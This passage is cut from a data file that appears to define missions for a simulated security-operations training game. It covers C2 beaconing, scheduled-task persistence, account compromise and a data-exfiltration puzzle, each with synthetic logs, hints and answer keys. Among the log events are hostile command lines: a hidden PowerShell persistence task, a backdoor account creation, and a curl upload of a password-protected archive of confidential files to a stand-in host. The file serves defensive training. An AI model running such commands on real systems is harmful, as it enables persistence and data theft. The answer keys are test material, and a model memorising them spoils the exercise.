      {
        eventId: 'EVT-404',
        timestamp: '2026-10-20T15:02:01Z',
        source: 'secure_proxy',
        eventType: 'web_proxy',
        severity: 'high',
        host: 'WKSTN-ENG-07',
        username: 'k.lindqvist',
        sourceIp: '10.20.30.17',
        destinationIp: '203.0.113.88',
        domain: 'cdn-telemetry-sync.example.net',
        processName: 'netcheck.exe',
        action: 'http_post',
        result: 'success',
        message: 'Outbound HTTPS POST beacon #1 to cdn-telemetry-sync.example.net/api/v1/pulse (203.0.113.88:443).',
        tags: ['c2_beacon'],
        metadata: { uri: '/api/v1/pulse', bytesOut: 2048, bytesIn: 512, relatedEventIds: ['EVT-403', 'EVT-405'] }
      },
      {
        eventId: 'EVT-405',
        timestamp: '2026-10-20T15:02:01Z',
        source: 'perimeter_fw',
        eventType: 'firewall_connection',
        severity: 'medium',
        host: 'WKSTN-ENG-07',
        sourceIp: '10.20.30.17',
        destinationIp: '203.0.113.88',
        action: 'egress_allow',
        result: 'success',
        message: 'TCP/443 session established from 10.20.30.17 to 203.0.113.88.',
        tags: ['c2_beacon'],
        metadata: { dstPort: 443, protocol: 'TCP' }
      },
      {
        eventId: 'EVT-406',
        timestamp: '2026-10-20T15:03:00Z',
        source: 'dns_resolver',
        eventType: 'dns_query',
        severity: 'high',
        host: 'WKSTN-ENG-07',
        username: 'k.lindqvist',
        sourceIp: '10.20.30.17',
        destinationIp: '203.0.113.88',
        domain: 'cdn-telemetry-sync.example.net',
        processName: 'netcheck.exe',
        action: 'dns_lookup',
        result: 'success',
        message: 'Repeated DNS lookup (+60s interval) for cdn-telemetry-sync.example.net -> 203.0.113.88.',
        tags: ['suspicious_domain', 'c2_beacon'],
        metadata: { resolvedIp: '203.0.113.88', intervalSeconds: 60 }
      },
      {
        eventId: 'EVT-407',
        timestamp: '2026-10-20T15:03:01Z',
        source: 'secure_proxy',
        eventType: 'web_proxy',
        severity: 'high',
        host: 'WKSTN-ENG-07',
        username: 'k.lindqvist',
        sourceIp: '10.20.30.17',
        destinationIp: '203.0.113.88',
        domain: 'cdn-telemetry-sync.example.net',
        processName: 'netcheck.exe',
        action: 'http_post',
        result: 'success',
        message: 'Outbound HTTPS POST beacon #2 (+60s interval) to cdn-telemetry-sync.example.net/api/v1/pulse.',
        tags: ['c2_beacon'],
        metadata: { uri: '/api/v1/pulse', bytesOut: 2048, bytesIn: 640 }
      },
      {
        eventId: 'EVT-408',
        timestamp: '2026-10-20T15:04:01Z',
        source: 'secure_proxy',
        eventType: 'web_proxy',
        severity: 'high',
        host: 'WKSTN-ENG-07',
        username: 'k.lindqvist',
        sourceIp: '10.20.30.17',
        destinationIp: '203.0.113.88',
        domain: 'cdn-telemetry-sync.example.net',
        processName: 'netcheck.exe',
        action: 'http_post',
        result: 'success',
        message: 'Outbound HTTPS POST beacon #3 (+60s interval) to cdn-telemetry-sync.example.net/api/v1/pulse.',
        tags: ['c2_beacon'],
        metadata: { uri: '/api/v1/pulse', bytesOut: 2048, bytesIn: 512 }
      }
    ],
    groundTruth: {
      classification: 'malicious_incident',
      severity: 'high',
      affectedEntities: ['WKSTN-ENG-07', 'k.lindqvist', 'cdn-telemetry-sync.example.net', '203.0.113.88'],
      attackStages: ['T1071.004', 'T1071.001'],
      expectedEvidenceIds: ['EVT-402', 'EVT-403', 'EVT-404', 'EVT-407'],
      bonusEvidenceIds: ['EVT-405', 'EVT-406', 'EVT-408'],
      expectedResponseActions: [
        {
          actionType: 'block_domain',
          target: 'cdn-telemetry-sync.example.net',
          required: true,
          consequence: 'Domain cdn-telemetry-sync.example.net sinkholed at DNS and blocked on web proxy.'
        },
        {
          actionType: 'block_ip',
          target: '203.0.113.88',
          required: true,
          consequence: 'Perimeter firewall blocked egress to C2 IP 203.0.113.88.'
        },
        {
          actionType: 'isolate_host',
          target: 'WKSTN-ENG-07',
          required: true,
          consequence: 'Workstation WKSTN-ENG-07 isolated to halt netcheck.exe daemon.'
        }
      ],
      explanation:
        'Pivoting on `cdn-telemetry-sync.example.net` and its resolved IP `203.0.113.88` reveals that an unsigned binary (`netcheck.exe` in `AppData\\Roaming\\SyncClient`, EVT-402) is executing automated HTTPS POST requests every 60 seconds (EVT-404, EVT-407, EVT-408). Containing the incident requires blocking both the domain and IP as well as isolating `WKSTN-ENG-07`.'
    }
  },
  {
    id: 'mission-5-persistence',
    order: 5,
    title: 'Mission 5: Persistence',
    subtitle: 'Timeline Construction, Scheduled Tasks & Authorized Maintenance Comparison',
    difficulty: 'Medium',
    estimatedMinutes: 15,
    xpReward: 350,
    minimumEvidenceRequired: 3,
    organization: 'Aegis BioLabs (Simulated Environment)',
    environment: 'Operations Workstation & Application Server Fleet',
    briefing: {
      summary:
        'Two scheduled task creation events were recorded within the environment: one on SRV-APP-02 and one on WKSTN-OPS-11. Construct a chronological timeline to determine which task is authorized maintenance and which represents an adversary persistence mechanism.',
      initialAlert: {
        alertId: 'ALT-5001',
        title: 'DET-007: Suspicious Scheduled Task & Registry Run Key Modification',
        severity: 'high',
        triggeredAt: '2026-10-20T16:30:02Z',
        entity: 'WKSTN-OPS-11 / SRV-APP-02'
      },
      knownFacts: [
        'IT Operations runs scheduled database cleanup on SRV-APP-02 under account `svc_patch_mgmt` with documented change tickets.',
        'Workstation WKSTN-OPS-11 is used by operations coordinator `t.bradley`.'
      ],
      unknowns: [
        'What initial process dropped the script on WKSTN-OPS-11?',
        'What persistence mechanisms were registered on WKSTN-OPS-11?',
        'Did the persistence mechanism subsequently trigger execution?'
      ],
      telemetrySources: ['edr_sensor', 'file_integrity', 'perimeter_fw'],
      timeWindow: '2026-10-20 16:10 UTC – 16:35 UTC',
      consequencesOfPoorDecisions:
        'Isolating SRV-APP-02 will take down an internal production server running authorized maintenance.'
    },
    objectives: [
      {
        id: 'obj-5-search',
        title: 'Search for scheduled task creations or persistence changes across hosts',
        type: 'run_search',
        minCount: 1
      },
      {
        id: 'obj-5-timeline',
        title: 'Inspect the Timeline to verify the 15-minute execution cycle on WKSTN-OPS-11',
        type: 'inspect_timeline'
      },
      {
        id: 'obj-5-evidence',
        title: 'Collect at least 3 evidence items showing initial dropper, persistence creation, and subsequent task execution on WKSTN-OPS-11',
        type: 'collect_evidence',
        minCount: 3,
        requiredAnyIds: ['EVT-502', 'EVT-503', 'EVT-504', 'EVT-505', 'EVT-506'],
        minRequiredMatches: 3
      },
      {
        id: 'obj-5-response',
        title: 'Isolate WKSTN-OPS-11 and quarantine the persistent script',
        type: 'execute_response',
        minCount: 2
      },
      {
        id: 'obj-5-report',
        title: 'Submit the Incident Assessment Report',
        type: 'complete_assessment'
      }
    ],
    hints: [
      {
        level: 1,
        text: 'Filter or query `host = "WKSTN-OPS-11"` and inspect the sequence of events between 16:14 UTC and 16:30 UTC.'
      },
      {
        level: 2,
        text: 'Notice how `updater_svc.exe` drops `C:\\ProgramData\\Telemetry\\beacon.ps1` (EVT-502), creates scheduled task `WindowsTelemetrySync` (EVT-503), adds an HKCU Run key (EVT-504), and 15 minutes later `taskeng.exe` executes `beacon.ps1` (EVT-505).'
      },
      {
        level: 3,
        text: 'Classify as Malicious Incident (High severity) on `WKSTN-OPS-11` (`t.bradley`). Execute "Isolate Endpoint" on `WKSTN-OPS-11` and "Quarantine File" on `C:\\ProgramData\\Telemetry\\beacon.ps1`.'
      }
    ],
    events: [
      {
        eventId: 'EVT-501',
        timestamp: '2026-10-20T16:10:00Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'low',
        host: 'SRV-APP-02',
        username: 'svc_patch_mgmt',
        processName: 'schtasks.exe',
        parentProcess: 'cmd.exe',
        commandLine: 'schtasks.exe /create /tn "CorpDBLogRotate" /tr "C:\\Program Files\\CorpIT\\rotate_logs.bat" /sc daily /st 02:00',
        action: 'process_start',
        result: 'success',
        message: 'Authorized maintenance account svc_patch_mgmt registered daily log rotation task (Ticket: CHG-88412).',
        tags: ['authorized_maintenance'],
        metadata: { changeTicket: 'CHG-88412', approvedBy: 'CAB-Weekly' }
      },
      {
        eventId: 'EVT-502',
        timestamp: '2026-10-20T16:14:45Z',
        source: 'file_integrity',
        eventType: 'file_activity',
        severity: 'high',
        host: 'WKSTN-OPS-11',
        username: 't.bradley',
        processName: 'updater_svc.exe',
        parentProcess: 'explorer.exe',
        action: 'file_create',
        result: 'success',
        message: 'Unsigned binary updater_svc.exe wrote script C:\\ProgramData\\Telemetry\\beacon.ps1.',
        tags: ['unsigned_script', 'programdata_drop'],
        metadata: { filePath: 'C:\\ProgramData\\Telemetry\\beacon.ps1', relatedEventIds: ['EVT-503', 'EVT-504'] }
      },
      {
        eventId: 'EVT-503',
        timestamp: '2026-10-20T16:15:00Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'high',
        host: 'WKSTN-OPS-11',
        username: 't.bradley',
        processName: 'schtasks.exe',
        parentProcess: 'updater_svc.exe',
        commandLine: 'schtasks.exe /create /sc minute /mo 15 /tn "WindowsTelemetrySync" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\ProgramData\\Telemetry\\beacon.ps1"',
        action: 'process_start',
        result: 'success',
        message: 'Scheduled task "WindowsTelemetrySync" created to run C:\\ProgramData\\Telemetry\\beacon.ps1 every 15 minutes.',
        tags: ['persistence_change'],
        metadata: { taskName: 'WindowsTelemetrySync', intervalMinutes: 15, relatedEventIds: ['EVT-502', 'EVT-505'] }
      },
      {
        eventId: 'EVT-504',
        timestamp: '2026-10-20T16:15:08Z',
        source: 'edr_sensor',
        eventType: 'endpoint_detection',
        severity: 'high',
        host: 'WKSTN-OPS-11',
        username: 't.bradley',
        processName: 'updater_svc.exe',
        action: 'registry_set_value',
        result: 'success',
        message: 'Registry persistence key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TelemetrySync set to C:\\ProgramData\\Telemetry\\beacon.ps1.',
        tags: ['persistence_change', 'registry_run_key'],
        metadata: { registryKey: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TelemetrySync', relatedEventIds: ['EVT-502'] }
      },
      {
        eventId: 'EVT-505',
        timestamp: '2026-10-20T16:30:00Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'high',
        host: 'WKSTN-OPS-11',
        username: 't.bradley',
        processName: 'powershell.exe',
        parentProcess: 'taskeng.exe',
        commandLine: 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\ProgramData\\Telemetry\\beacon.ps1',
        action: 'process_start',
        result: 'success',
        message: 'Task Scheduler engine (taskeng.exe) triggered execution of persistent script C:\\ProgramData\\Telemetry\\beacon.ps1 (+15m).',
        tags: ['persistence_execution'],
        metadata: { triggeredByTask: 'WindowsTelemetrySync', relatedEventIds: ['EVT-503', 'EVT-506'] }
      },
      {
        eventId: 'EVT-506',
        timestamp: '2026-10-20T16:30:02Z',
        source: 'perimeter_fw',
        eventType: 'firewall_connection',
        severity: 'high',
        host: 'WKSTN-OPS-11',
        username: 't.bradley',
        sourceIp: '10.20.22.31',
        destinationIp: '198.51.100.92',
        processName: 'powershell.exe',
        action: 'egress_allow',
        result: 'success',
        message: 'Outbound C2 callback from WKSTN-OPS-11 (10.20.22.31) to 198.51.100.92:8443 initiated by persistent task.',
        tags: ['c2_beacon'],
        metadata: { dstPort: 8443, relatedEventIds: ['EVT-505'] }
      }
    ],
    groundTruth: {
      classification: 'malicious_incident',
      severity: 'high',
      affectedEntities: ['WKSTN-OPS-11', 't.bradley', 'beacon.ps1', '198.51.100.92'],
      attackStages: ['T1053.005', 'T1547.001', 'T1059.001'],
      expectedEvidenceIds: ['EVT-502', 'EVT-503', 'EVT-504', 'EVT-505'],
      bonusEvidenceIds: ['EVT-506', 'EVT-501'],
      expectedResponseActions: [
        {
          actionType: 'isolate_host',
          target: 'WKSTN-OPS-11',
          required: true,
          consequence: 'Workstation WKSTN-OPS-11 isolated from the network.'
        },
        {
          actionType: 'quarantine_file',
          target: 'beacon.ps1',
          required: true,
          consequence: 'Persistent payload C:\\ProgramData\\Telemetry\\beacon.ps1 quarantined.'
        },
        {
          actionType: 'block_ip',
          target: '198.51.100.92',
          required: false,
          consequence: 'Blocked outbound callback IP 198.51.100.92.'
        }
      ],
      explanation:
        'Timeline correlation shows that while SRV-APP-02 had an approved change ticket (`CHG-88412`, EVT-501), `WKSTN-OPS-11` had an unsigned binary drop `C:\\ProgramData\\Telemetry\\beacon.ps1` (EVT-502), register both a 15-minute scheduled task (EVT-503) and an HKCU Run key (EVT-504), and execute the persistent payload 15 minutes later via `taskeng.exe` (EVT-505) to contact `198.51.100.92` (EVT-506).'
    }
  },
  {
    id: 'mission-6-compromised-account',
    order: 6,
    title: 'Mission 6: The Compromised Account',
    subtitle: 'Identity Compromise, Lateral Movement & Privilege Escalation',
    difficulty: 'Medium to Hard',
    estimatedMinutes: 16,
    xpReward: 400,
    minimumEvidenceRequired: 4,
    organization: 'Aegis BioLabs (Simulated Environment)',
    environment: 'Cloud Identity & Directory Administration Tier',
    briefing: {
      summary:
        'Directory Services generated a critical alert after systems engineer account `j.kovacs` was added to the `Cloud Infra Admins` security group outside a change window, followed by the creation of a new local account on `WKSTN-ADM-03`. Investigate the full identity and endpoint chain.',
      initialAlert: {
        alertId: 'ALT-6001',
        title: 'DET-008 / DET-012: Unapproved Privilege Escalation & Backdoor Account Creation',
        severity: 'critical',
        triggeredAt: '2026-10-20T18:45:19Z',
        entity: 'j.kovacs / WKSTN-ADM-03'
      },
      knownFacts: [
        'User `j.kovacs` normally logs in from internal subnet `10.20.15.0/24`.',
        'Adding users to `Cloud Infra Admins` requires an approved IAM ticket in metadata.'
      ],
      unknowns: [
        'How did the adversary gain access to `j.kovacs`?',
        'What privileged actions were taken once `j.kovacs` accessed `WKSTN-ADM-03`?',
        'Was a secondary backdoor account created for persistence?'
      ],
      telemetrySources: ['iam_auth', 'directory_svc', 'edr_sensor', 'secure_proxy'],
      timeWindow: '2026-10-20 18:35 UTC – 18:55 UTC',
      consequencesOfPoorDecisions:
        'Disabling only `j.kovacs` while leaving the newly created backdoor account `svc_diag_temp` active allows the adversary to retain administrative access.'
    },
    objectives: [
      {
        id: 'obj-6-search',
        title: 'Query events involving "j.kovacs" or "WKSTN-ADM-03"',
        type: 'run_search',
        minCount: 1
      },
      {
        id: 'obj-6-evidence',
        title: 'Collect at least 4 evidence items covering anomalous login, privilege escalation, and backdoor account creation',
        type: 'collect_evidence',
        minCount: 4,
        requiredAnyIds: ['EVT-602', 'EVT-604', 'EVT-605', 'EVT-606'],
        minRequiredMatches: 4
      },
      {
        id: 'obj-6-detections',
        title: 'Run the Detection Engine to correlate ATT&CK Privilege Escalation techniques',
        type: 'run_detections'
      },
      {
        id: 'obj-6-response',
        title: 'Disable both compromised/backdoor accounts, revoke sessions, and block the attacker IP',
        type: 'execute_response',
        minCount: 3
      },
      {
        id: 'obj-6-report',
        title: 'Submit the Incident Assessment Report',
        type: 'complete_assessment'
      }
    ],
    hints: [
      {
        level: 1,
        text: 'Search `username = "j.kovacs" OR host = "WKSTN-ADM-03"` to trace the session from initial login to directory changes.'
      },
      {
        level: 2,
        text: 'Examine EVT-602 (anomalous external login from `198.51.100.77`), EVT-605 (adding `j.kovacs` to `Cloud Infra Admins`), and EVT-606 (creating backdoor account `svc_diag_temp`).'
      },
      {
        level: 3,
        text: 'Classify as Malicious Incident (Critical severity). Execute "Disable User Account" on `j.kovacs`, "Disable User Account" on `svc_diag_temp`, "Revoke Active Sessions" on `j.kovacs`, and "Block External IP" on `198.51.100.77`.'
      }
    ],
    events: [
      {
        eventId: 'EVT-601',
        timestamp: '2026-10-20T18:36:10Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'medium',
        host: 'SSO-GW-01',
        username: 'j.kovacs',
        sourceIp: '198.51.100.77',
        action: 'user_login',
        result: 'failure',
        message: 'Failed login attempt for j.kovacs from external IP 198.51.100.77.',
        tags: ['external_ip', 'failed_auth'],
        metadata: { asn: 'AS64500-EXT' }
      },
      {
        eventId: 'EVT-602',
        timestamp: '2026-10-20T18:36:42Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'high',
        host: 'SSO-GW-01',
        username: 'j.kovacs',
        sourceIp: '198.51.100.77',
        action: 'user_login',
        result: 'success',
        message: 'Successful login for j.kovacs from anomalous external IP 198.51.100.77 via session cookie replay.',
        tags: ['external_ip', 'anomalous_geo'],
        metadata: { authMethod: 'session_token_replay', relatedEventIds: ['EVT-601', 'EVT-604'] }
      },
      {
        eventId: 'EVT-603',
        timestamp: '2026-10-20T18:39:00Z',
        source: 'directory_svc',
        eventType: 'account_change',
        severity: 'low',
        host: 'DC-CORP-01',
        username: 'svc_iam_sync',
        sourceIp: '10.20.1.10',
        action: 'group_membership_add',
        result: 'success',
        message: 'Routine HR onboarding added new hire n.brooks to standard "All-Employees" group (Ticket: REQ-55102).',
        tags: ['routine_onboarding'],
        metadata: { targetUser: 'n.brooks', groupName: 'All-Employees', ticketId: 'REQ-55102' }
      },
      {
        eventId: 'EVT-604',
        timestamp: '2026-10-20T18:41:15Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'high',
        host: 'WKSTN-ADM-03',
        username: 'j.kovacs',
        sourceIp: '198.51.100.77',
        action: 'rdp_session_start',
        result: 'success',
        message: 'Account j.kovacs established administrative jump-host session on WKSTN-ADM-03.',
        tags: ['lateral_movement'],
        metadata: { logonType: 10, relatedEventIds: ['EVT-602', 'EVT-605'] }
      },
      {
        eventId: 'EVT-605',
        timestamp: '2026-10-20T18:43:05Z',
        source: 'directory_svc',
        eventType: 'account_change',
        severity: 'critical',
        host: 'WKSTN-ADM-03',
        username: 'j.kovacs',
        sourceIp: '198.51.100.77',
        action: 'group_membership_add',
        result: 'success',
        message: 'User j.kovacs added account j.kovacs to privileged group "Cloud Infra Admins" (No change ticket found).',
        tags: ['privileged_group', 'unapproved_change'],
        metadata: { targetUser: 'j.kovacs', groupName: 'Cloud Infra Admins', changeTicket: null, relatedEventIds: ['EVT-604', 'EVT-606'] }
      },
      {
        eventId: 'EVT-606',
        timestamp: '2026-10-20T18:45:19Z',
        source: 'directory_svc',
        eventType: 'account_change',
        severity: 'critical',
        host: 'WKSTN-ADM-03',
        username: 'j.kovacs',
        processName: 'net.exe',
        commandLine: 'net.exe user svc_diag_temp P@ssw0rd_Sim99! /add /domain',
        action: 'user_created',
        result: 'success',
        message: 'Account j.kovacs created unapproved directory account "svc_diag_temp" from WKSTN-ADM-03.',
        tags: ['unapproved_account', 'persistence_change'],
        metadata: { createdAccount: 'svc_diag_temp', relatedEventIds: ['EVT-605', 'EVT-607'] }
      },
      {
        eventId: 'EVT-607',
        timestamp: '2026-10-20T18:46:02Z',
        source: 'secure_proxy',
        eventType: 'web_proxy',
        severity: 'high',
        host: 'WKSTN-ADM-03',
        username: 'j.kovacs',
        sourceIp: '10.20.5.33',
        destinationIp: '10.20.2.80',
        domain: 'vault-keys.internal.example.com',
        action: 'http_get',
        result: 'success',
        message: 'Elevated account j.kovacs accessed internal infrastructure secrets metadata listing.',
        tags: ['sensitive_asset'],
        metadata: { uri: '/v1/secrets/list', statusCode: 200, relatedEventIds: ['EVT-605'] }
      }
    ],
    groundTruth: {
      classification: 'malicious_incident',
      severity: 'critical',
      affectedEntities: ['j.kovacs', 'svc_diag_temp', 'WKSTN-ADM-03', '198.51.100.77'],
      attackStages: ['T1078', 'T1098', 'T1136.001'],
      expectedEvidenceIds: ['EVT-602', 'EVT-604', 'EVT-605', 'EVT-606'],
      bonusEvidenceIds: ['EVT-601', 'EVT-607'],
      expectedResponseActions: [
        {
          actionType: 'disable_account',
          target: 'j.kovacs',
          required: true,
          consequence: 'Compromised engineer account j.kovacs disabled.'
        },
        {
          actionType: 'disable_account',
          target: 'svc_diag_temp',
          required: true,
          consequence: 'Rogue backdoor account svc_diag_temp disabled.'
        },
        {
          actionType: 'revoke_sessions',
          target: 'j.kovacs',
          required: true,
          consequence: 'All active tokens and jump-host sessions for j.kovacs revoked.'
        },
        {
          actionType: 'block_ip',
          target: '198.51.100.77',
          required: true,
          consequence: 'Blocked external attacker IP 198.51.100.77.'
        }
      ],
      explanation:
        'An adversary authenticated as `j.kovacs` from anomalous external IP `198.51.100.77` (EVT-602), pivoted to jump host `WKSTN-ADM-03` (EVT-604), self-elevated into `Cloud Infra Admins` without a ticket (EVT-605), created a rogue persistence account `svc_diag_temp` (EVT-606), and enumerated secrets metadata (EVT-607). Both `j.kovacs` and `svc_diag_temp` must be disabled.'
    }
  },
  {
    id: 'mission-7-data-exfiltration-puzzle',
    order: 7,
    title: 'Mission 7: The Data Exfiltration Puzzle',
    subtitle: 'Competing Hypotheses: Authorized Backup vs. Staged Exfiltration',
    difficulty: 'Hard',
    estimatedMinutes: 18,
    xpReward: 450,
    minimumEvidenceRequired: 4,
    organization: 'Aegis BioLabs (Simulated Environment)',
    environment: 'Executive Legal Subnet & Disaster Recovery Vault',
    briefing: {
      summary:
        'Network flow sensors reported two high-volume outbound transfers around 20:00 UTC: a 480 MB transfer from SRV-FIN-BACKUP to `192.0.2.10` (`dr-vault.example.com`) and a 42 MB transfer from WKSTN-LEGAL-05 to `203.0.113.195` (`drop-storage-api.example.net`). Remember: transfer volume alone does not prove exfiltration. Correlate file access, archiving, and process context.',
      initialAlert: {
        alertId: 'ALT-7001',
        title: 'DET-010 / DET-011: Sensitive File Collection & High-Volume Outbound Egress',
        severity: 'critical',
        triggeredAt: '2026-10-20T20:08:44Z',
        entity: 'WKSTN-LEGAL-05 / SRV-FIN-BACKUP'
      },
      knownFacts: [
        'Aegis BioLabs runs a nightly Disaster Recovery backup from SRV-FIN-BACKUP to `dr-vault.example.com` (192.0.2.10) at 20:00 UTC using signed `VeeamAgent.exe`.',
        'Workstation WKSTN-LEGAL-05 is assigned to paralegal account `l.martinez`.'
      ],
      unknowns: [
        'Is the 480 MB transfer from SRV-FIN-BACKUP legitimate?',
        'What specific files were accessed and staged on WKSTN-LEGAL-05 prior to its 42 MB outbound upload?',
        'How were the files packaged and transmitted?'
      ],
      telemetrySources: ['file_integrity', 'edr_sensor', 'secure_proxy', 'perimeter_fw'],
      timeWindow: '2026-10-20 19:55 UTC – 20:15 UTC',
      consequencesOfPoorDecisions:
        'Blocking `192.0.2.10` or isolating `SRV-FIN-BACKUP` will break enterprise disaster recovery backups, whereas failing to contain `WKSTN-LEGAL-05` and `203.0.113.195` permits confidential M&A exfiltration.'
    },
    objectives: [
      {
        id: 'obj-7-search',
        title: 'Compare file and network telemetry on SRV-FIN-BACKUP vs. WKSTN-LEGAL-05',
        type: 'run_search',
        minCount: 2
      },
      {
        id: 'obj-7-timeline',
        title: 'Inspect the Timeline to trace file collection -> 7z archive staging -> HTTPS upload',
        type: 'inspect_timeline'
      },
      {
        id: 'obj-7-evidence',
        title: 'Collect at least 4 evidence items proving sensitive file collection, archive staging, and exfiltration on WKSTN-LEGAL-05',
        type: 'collect_evidence',
        minCount: 4,
        requiredAnyIds: ['EVT-703', 'EVT-704', 'EVT-705', 'EVT-706', 'EVT-707', 'EVT-708'],
        minRequiredMatches: 4
      },
      {
        id: 'obj-7-response',
        title: 'Preserve volatile evidence, isolate WKSTN-LEGAL-05, and block the exfiltration endpoint',
        type: 'execute_response',
        minCount: 3
      },
      {
        id: 'obj-7-report',
        title: 'Submit the Incident Assessment Report',
        type: 'complete_assessment'
      }
    ],
    hints: [
      {
        level: 1,
        text: 'Compare EVT-701/EVT-702 on `SRV-FIN-BACKUP` (signed `VeeamAgent.exe` sending to approved DR vault `192.0.2.10`) against the activity on `WKSTN-LEGAL-05`.'
      },
      {
        level: 2,
        text: 'On `WKSTN-LEGAL-05`, examine EVT-703, EVT-704, and EVT-705 (rapid access to restricted M&A files), EVT-706 (`7z.exe` creating password-protected `aurora_bundle.7z`), and EVT-707 (`curl.exe` uploading `aurora_bundle.7z` to `drop-storage-api.example.net` / `203.0.113.195`).'
      },
      {
        level: 3,
        text: 'Classify as Malicious Incident (Critical severity) affecting `WKSTN-LEGAL-05` and `l.martinez`. Execute "Preserve Volatile Evidence" on `WKSTN-LEGAL-05`, "Isolate Endpoint" on `WKSTN-LEGAL-05`, "Block External IP" on `203.0.113.195`, and "Sinkhole / Block Domain" on `drop-storage-api.example.net`.'
      }
    ],
    events: [
      {
        eventId: 'EVT-701',
        timestamp: '2026-10-20T20:00:02Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'low',
        host: 'SRV-FIN-BACKUP',
        username: 'svc_backup',
        processName: 'VeeamAgent.exe',
        parentProcess: 'services.exe',
        commandLine: '"C:\\Program Files\\Veeam\\Endpoint Backup\\VeeamAgent.exe" --job NightlyDRSync',
        action: 'process_start',
        result: 'success',
        message: 'Authorized nightly DR backup job started on SRV-FIN-BACKUP (Policy: DR-NIGHTLY-01).',
        tags: ['authorized_backup', 'signed_binary'],
        metadata: { policyId: 'DR-NIGHTLY-01', destination: 'dr-vault.example.com' }
      },
      {
        eventId: 'EVT-702',
        timestamp: '2026-10-20T20:01:15Z',
        source: 'perimeter_fw',
        eventType: 'firewall_connection',
        severity: 'low',
        host: 'SRV-FIN-BACKUP',
        username: 'svc_backup',
        sourceIp: '10.20.4.10',
        destinationIp: '192.0.2.10',
        domain: 'dr-vault.example.com',
        processName: 'VeeamAgent.exe',
        action: 'egress_allow',
        result: 'success',
        message: 'Transferred 480 MB encrypted backup snapshot to approved DR vault 192.0.2.10 (dr-vault.example.com).',
        tags: ['authorized_backup'],
        metadata: { bytesOut: 503316480, approvedDestination: true, relatedEventIds: ['EVT-701'] }
      },
      {
        eventId: 'EVT-703',
        timestamp: '2026-10-20T20:04:10Z',
        source: 'file_integrity',
        eventType: 'file_activity',
        severity: 'high',
        host: 'WKSTN-LEGAL-05',
        username: 'l.martinez',
        processName: '7z.exe',
        action: 'file_read',
        result: 'success',
        message: 'Process 7z.exe read restricted M&A document C:\\Shares\\Legal_Confidential\\Project_Aurora_Terms.pdf.',
        tags: ['sensitive_asset', 'archive_staging'],
        metadata: { classification: 'Restricted-Board', filePath: 'C:\\Shares\\Legal_Confidential\\Project_Aurora_Terms.pdf' }
      },
      {
        eventId: 'EVT-704',
        timestamp: '2026-10-20T20:04:14Z',
        source: 'file_integrity',
        eventType: 'file_activity',
        severity: 'high',
        host: 'WKSTN-LEGAL-05',
        username: 'l.martinez',
        processName: '7z.exe',
        action: 'file_read',
        result: 'success',
        message: 'Process 7z.exe read restricted spreadsheet C:\\Shares\\Legal_Confidential\\CapTable_2026.xlsx.',
        tags: ['sensitive_asset', 'archive_staging'],
        metadata: { classification: 'Restricted-Board', filePath: 'C:\\Shares\\Legal_Confidential\\CapTable_2026.xlsx' }
      },
      {
        eventId: 'EVT-705',
        timestamp: '2026-10-20T20:04:19Z',
        source: 'file_integrity',
        eventType: 'file_activity',
        severity: 'high',
        host: 'WKSTN-LEGAL-05',
        username: 'l.martinez',
        processName: '7z.exe',
        action: 'file_read',
        result: 'success',
        message: 'Process 7z.exe read restricted patent filing C:\\Shares\\Legal_Confidential\\BioSynth_Patent_Draft.docx.',
        tags: ['sensitive_asset', 'archive_staging'],
        metadata: { classification: 'Restricted-IP', filePath: 'C:\\Shares\\Legal_Confidential\\BioSynth_Patent_Draft.docx' }
      },
      {
        eventId: 'EVT-706',
        timestamp: '2026-10-20T20:05:02Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'high',
        host: 'WKSTN-LEGAL-05',
        username: 'l.martinez',
        processName: '7z.exe',
        parentProcess: 'cmd.exe',
        commandLine: '7z.exe a -pExfilKey2026! C:\\Users\\l.martinez\\AppData\\Local\\Temp\\aurora_bundle.7z C:\\Shares\\Legal_Confidential\\*',
        action: 'process_start',
        result: 'success',
        message: 'Created password-protected archive aurora_bundle.7z (42.1 MB) from Legal_Confidential share.',
        tags: ['archive_staging', 'sensitive_asset'],
        metadata: { archivePath: 'C:\\Users\\l.martinez\\AppData\\Local\\Temp\\aurora_bundle.7z', relatedEventIds: ['EVT-703', 'EVT-704', 'EVT-705', 'EVT-707'] }
      },
      {
        eventId: 'EVT-707',
        timestamp: '2026-10-20T20:08:11Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'critical',
        host: 'WKSTN-LEGAL-05',
        username: 'l.martinez',
        processName: 'curl.exe',
        parentProcess: 'cmd.exe',
        commandLine: 'curl.exe -X POST -F "file=@C:\\Users\\l.martinez\\AppData\\Local\\Temp\\aurora_bundle.7z" https://drop-storage-api.example.net/upload',
        action: 'process_start',
        result: 'success',
        message: 'Executed curl.exe to upload staged archive aurora_bundle.7z to external host drop-storage-api.example.net.',
        tags: ['anomalous_egress'],
        metadata: { relatedEventIds: ['EVT-706', 'EVT-708'] }
      },
      {
        eventId: 'EVT-708',
        timestamp: '2026-10-20T20:08:44Z',
        source: 'secure_proxy',
        eventType: 'web_proxy',
        severity: 'critical',
        host: 'WKSTN-LEGAL-05',
        username: 'l.martinez',
        sourceIp: '10.20.40.19',
        destinationIp: '203.0.113.195',
        domain: 'drop-storage-api.example.net',
        processName: 'curl.exe',
        action: 'http_post',
        result: 'success',
        message: 'Outbound HTTPS POST upload (42.1 MB) from WKSTN-LEGAL-05 to uncategorized endpoint drop-storage-api.example.net (203.0.113.195).',
        tags: ['anomalous_egress', 'c2_beacon'],
        metadata: { bytesOut: 44145000, statusCode: 201, relatedEventIds: ['EVT-707'] }
      }
    ],
    groundTruth: {
      classification: 'malicious_incident',
      severity: 'critical',
      affectedEntities: ['WKSTN-LEGAL-05', 'l.martinez', 'drop-storage-api.example.net', '203.0.113.195'],
      attackStages: ['T1005', 'T1041'],
      expectedEvidenceIds: ['EVT-703', 'EVT-706', 'EVT-707', 'EVT-708'],
